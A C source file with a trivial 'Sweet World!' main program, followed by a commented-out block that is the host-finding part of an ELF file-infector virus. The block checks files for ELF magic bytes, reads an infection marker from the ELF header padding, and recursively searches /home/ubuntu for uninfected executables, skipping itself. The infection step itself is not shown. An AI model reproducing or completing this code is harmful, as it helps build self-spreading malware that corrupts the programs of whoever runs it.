#include<stdio.h>
#include<stdlib.h>
int main(){
    printf("Sweet World!\n");
    return 0;
}
// #include <unistd.h>
// #include <sys/types.h>
// #include <dirent.h>
// #include <stdio.h>
// #include <string.h>
// #include <stdio.h>
// #include <dirent.h>
// #include <stdbool.h>
// #include <sys/stat.h>
// #include <sys/sendfile.h> 
// #include <sys/wait.h>
// #include <fcntl.h>
// #include <unistd.h>
// #include <stdlib.h>
// #include <time.h>
// #include <string.h>
// #include <stdint.h>
// #include <sys/mman.h>
// #include <elf.h>

// #define MAGIC_NUMBER 0x15D25



// /* Returns true if the file's format is ELF (Executeable and Linkable Format)
//  * ELF files have the first four bytes as {0x7f, 'E', 'L', 'F'}
//  */
// bool isELF(char* path, char* fileName) {
// 	if(fileName[0] == '.') return false;

// 	int host_fd = open(path, O_RDONLY);
	
// 	char header[4];
// 	read(host_fd, header, 4);
	
// 	close(host_fd);

// 	return header[0] == 0x7f
// 		&& header[1] == 'E'
// 		&& header[2] == 'L'
// 		&& header[3] == 'F';
// }

// /**
//  * Returns true if the file has not been infected yet
//  * by checking the padding entry in the EI_PAD of elf header
//  */
// bool isHealthy(char* fileName) {
// 	int fd = open(fileName, O_RDONLY);
// 	lseek(fd, EI_PAD, SEEK_SET);
// 	uint32_t flag;
// 	read(fd,&flag,4);
// 	close(fd);
// 	return flag != MAGIC_NUMBER;
// }

// void getHealthyHostFile(char*retPath, char* self_name, char *name, int indent)
// {
//     DIR *dir;
//     struct dirent *entry;
//     struct stat st;
//     if (!(dir = opendir(name)))
//         return ;

//     while ((entry = readdir(dir)) != NULL) {
//         if (entry->d_type == DT_DIR) {
//             char path[1024];
//             if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0 || entry->d_name[0]=='.')
//                 continue;
//             snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
//             getHealthyHostFile(retPath, self_name,path, indent + 2);
//             printf("%s\n",path);
//             if(retPath[0]!='\0')
//                 return;
            
//         } else {
//             char path[1024];
//             snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
//             stat(path, &st);
//             if(!strcmp(entry->d_name, self_name)) continue;	// Don't infect self
//             printf("%s\n",path);
//             if(isELF(path,entry->d_name) && isHealthy(path)){
//                 // printf("%s\n",path);
//                 strcpy(retPath, path);
//                 closedir(dir);
//                 return ;
//             }
//         }
//     }
//     closedir(dir);
//     return;
// }


// int main(int argc, char *argv[]) {

//     char cleanHostName[1024]="\0";
//     // cleanHostName[0]='\0';
//     getHealthyHostFile(cleanHostName,(char*)argv[0] + 2,"/home/ubuntu", 0);
//     printf("Answer: %s\n",cleanHostName);

//     return 0;
// }